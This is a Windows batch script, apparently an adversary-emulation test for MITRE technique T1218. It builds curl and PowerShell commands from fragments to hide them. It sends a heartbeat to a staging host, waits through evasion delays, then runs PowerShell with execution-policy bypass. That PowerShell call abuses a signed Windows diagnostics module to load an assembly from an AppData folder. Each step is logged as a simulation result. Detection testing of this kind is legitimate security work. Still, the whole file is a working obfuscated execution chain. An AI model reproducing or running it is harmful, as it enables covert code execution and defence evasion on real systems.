@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET bcftgz=%APPDATA%\7711\0aaecd8b
SET yshmng=https://10.0.0.49
SET qegsmp=https://10.0.0.49/stage/2/icon.png?7711-10
SET srsfea=ITZEL-S2BO
SET vsggli=10
SET acuara=wimrar.txt
SET svlvek=7711
SET cmfegp=1

REM Obfuscated variables
SET dcj=cu
SET pqu=rl
SET wqb=.exe
SET zxk=%dcj%%pqu%%wqb%
SET mnx= -k
SET klp= -s
SET vtc= -o
SET nqw= nul
SET jhn=%mnx%%klp%%vtc%%nqw%
SET bnm=http
SET vgh=://
SET xcj=%bnm%%vgh%
SET rsq=se
SET tyu=le
SET dfg=%rsq%%tyu%

REM Log file path
SET ytrewq=!APPDATA!\!vsggli!
IF NOT EXIST "!ytrewq!" MD "!ytrewq!" 2>nul
SET hjkl=!ytrewq!\macula-simulations.log

REM DEBUG: Script start
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: SCRIPT_START=initializing>> "!hjkl!" 2>nul)

REM Initial delay
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_START=30s>> "!hjkl!" 2>nul)
timeout /t 30 /nobreak >nul
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_RESULT=success>> "!hjkl!" 2>nul)

REM Obfuscated heartbeat check
SET ref1=zxk
SET ref2=jhn
SET ref3=qegsmp
CALL SET exe1=%%!ref1!%%
CALL SET args1=%%!ref2!%%
CALL SET target1=%%!ref3!%%

REM DEBUG: Heartbeat start
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: HEARTBEAT_START=!target1!>> "!hjkl!" 2>nul)

CALL !exe1!!args1! "!target1!"
SET rhbc=!ERRORLEVEL!

REM DEBUG: Heartbeat result
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: HEARTBEAT_RESULT=errorlevel=!rhbc!>> "!hjkl!" 2>nul)

REM Random delay
SET /A bcdd=%RANDOM% %% 20 + 10
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_START=!bcdd!s>> "!hjkl!" 2>nul)
timeout /t !bcdd! /nobreak >nul
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_RESULT=success>> "!hjkl!" 2>nul)

REM Middle delay
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_START=10s>> "!hjkl!" 2>nul)
ping -n 10 127.0.0.1 >nul
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_RESULT=success>> "!hjkl!" 2>nul)

REM Build PowerShell command via variable arrays
SET idx0=po
SET idx1=we
SET idx2=rs
SET idx3=he
SET idx4=ll
SET idx5=.exe
SET idx6= -ep
SET idx7= bypass
SET idx8= -command
SET idx9= "set-location -path c:\windows\diagnostics\system\networking; import-module .\
SET idx10=UtilityFunctions.ps1
SET idx11=; RegSnapin 
SET idx12=!bcftgz!
SET idx13=\\
SET idx14=!acuara!
SET idx15=;[Program.Class]::Dale()"

SETLOCAL EnableDelayedExpansion
SET pscom=!idx0!!idx1!!idx2!!idx3!!idx4!!idx5!!idx6!!idx7!!idx8!!idx9!!idx10!!idx11!!idx12!!idx13!!idx14!!idx15!
FOR /F "delims=" %%A IN ("!pscom!") DO (
    ENDLOCAL
    SET "pscom=%%A"
)

REM DEBUG: Process start
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: PROCESS_START=!pscom:~0,100!...>> "!hjkl!" 2>nul)

REM Execute DLL via PowerShell
%pscom%
SET kjed=!ERRORLEVEL!

REM DEBUG: Process result
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: PROCESS_RESULT=errorlevel=!kjed!>> "!hjkl!" 2>nul)

REM Final delay
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_START=15s>> "!hjkl!" 2>nul)
CHOICE /C Y /N /D Y /T 15 >nul
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: DELAY_RESULT=success>> "!hjkl!" 2>nul)

REM TTP Logging - T1218
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET hgtr=%%I
SET yyyy=!hgtr:~0,4!
SET mm=!hgtr:~4,2!
SET dd=!hgtr:~6,2!
SET hh=!hgtr:~8,2!
SET min=!hgtr:~10,2!
SET ss=!hgtr:~12,2!
SET ms=!hgtr:~15,3!
SET stamp=!yyyy!-!mm!-!dd! !hh!:!min!:!ss!.!ms!

IF !kjed!==0 (
    SET ttp_res=1
    SET ttp_err=
) ELSE (
    SET ttp_res=0
    SET ttp_err=assembly_load_failed
)

ECHO [!stamp!][!srsfea!]: !vsggli!-!svlvek!-T1218|Signed Binary Proxy Execution=!ttp_res!:!ttp_err!>> "!hjkl!" 2>nul

REM DEBUG: Script end
IF "!cmfegp!"=="1" (echo [!DATE! !TIME!][DEBUG][!srsfea!]: SCRIPT_END=exit_code=!kjed!>> "!hjkl!" 2>nul)

EXIT /B !kjed!